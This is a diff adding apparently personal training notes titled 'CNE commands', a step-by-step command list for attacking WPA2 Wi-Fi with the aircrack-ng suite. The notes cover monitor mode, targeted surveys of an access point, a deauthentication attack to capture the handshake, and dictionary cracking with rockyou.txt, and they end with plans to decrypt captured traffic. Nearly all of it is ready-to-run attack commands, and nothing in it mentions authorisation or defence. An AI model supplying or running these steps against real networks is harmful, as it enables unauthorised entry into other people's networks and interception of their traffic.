@@ -1,0 +1,102 @@
+CNE commands
+
+Revising these commands for ease of use -Q
+
+!! Open a command shell
+\/
+ctrl + alt + t 
+or just go to the top left and click on the icon
+
+Go ahead and connect your wireless adapter (this is going to be your Alfa card or Trendnet and will be here on out called a wireless interface)
+
+!! See interfaces
+\/
+ip addr
+iwconfig
+
+!!the wireless interface should pop up as wlan1 or wlan3 for kali
+if in ubuntu it might pop up as wpldklsdfolighj or some shit like that
+
+!! kill processes (this is not mandatory but is reccomended if your going to be doing static collect 
+or youre just going to be collecting for a long time, this command is going to kill your network manager which 
+is how you connect to wifi)
+\/
+sudo airmon-ng check kill
+
+!! Start monitor mode (if running two wifi adapters youre going to need this command twice, once for each interface.
+Keep in mind this is going top add "mon" to the end of you interface's name)
+\/
+sudo airmon-ng start <wireless interface>
+
+EXAMPLE: sudo airmon-ng start wlan1
+
+!! Verify that monitor mode is used
+\/
+sudo airmon-ng 
+
+!! You could also use iwconfig to check that interface is in monitor mode:
+\/
+iwconfig
+
+!! Get the AP's MAC address and channel (you can skip this if you're doing a broad survey)
+\/
+sudo airodump-ng <wireless interface>
+
+EXAMPLE: sudo airodump-ng wlan1mon
+
+!! Yes you can use both wifi adapters for different surveys, have one be for broad and you second be for a targetted.
+
+!! Broad Survey 
+( -w is to write a file, --band is for specifying 2.4g or 5g/both (airsuite does 2.4 by default)
+--gpsd is for gps)
+\/
+sudo airodump-ng -w <filename> <wireless interface> --band abg --gpsd
+
+EXAMPLE: sudo airodump-ng -w BroadSurvey wlan1mon --band abg --gpsd
+
+!! Targetted Survey
+(Make sure you replace the channel number and bssid with your own)
+\/
+sudo airodump-ng -w <filename> -c <channel> --bssid <mac of access point> <wireless interface>
+
+EXAMPLE sudo airodump-ng -w TargettedSurvey -c 6 --bssid 90:9A:4A:B8:F3:FB wlan1mon
+
+!!!!!ACTIVE BEYOND THIS POINT, ALL ATTACKS WILL BE USING A TARGETTED SURVEY!!!!!
+
+!! create a 2nd terminal - deauth attack
+(meant for WPA2)
+
+!! Make sure you replace the bssid with your own
+(the --deauth is the type of attack, the 1 is how many attacks youre using, -a is the BSSID of the access point)
+\/
+sudo aireplay-ng --deauth 1 -a <BSSID of AP> <wireless interface>
+
+EXAMPLE: sudo aireplay-ng --deauth 1 -a 90:9A:4A:B8:F3:FB wlan0mon
+
+!! Stop monitor mode
+(puts interface back in managed mode)
+\/
+airmon-ng stop <wireless interface>
+
+EXAMPLE: airmon-ng stop wlan1mon
+
+!! in your first terminal you should see that it says it caught a handshake somewhere along the top right,
+go ahead and ctrl + c that terminal to put it into a pcap
+
+!! you should have a dictionary/ wordlist in the desktop, it will most likely be the rockyou.txt file 
+
+!! view your pcap in the first terminal
+(should end in a .pcap or .cap and it will be whatever you named)
+\/
+ls
+
+!! crack the WPA2 encryption with the pcap and rockyou.txt
+(the -w here refers to what wordlist you want to use)
+\/
+aircrack-ng <file you named>.pcap -w Desktop/rockyou.txt 
+
+!! sit back and relax this might take awhile depending on the rockyou.txt file i downloaded.
+
+!! the rest of this i'll fill in later when i refine my notes, for now contact a 17 for help, im still reserching and trouble shooting 
+which way will be easiest to decrypt the trafic and what filters to have everyone use. -Q
+
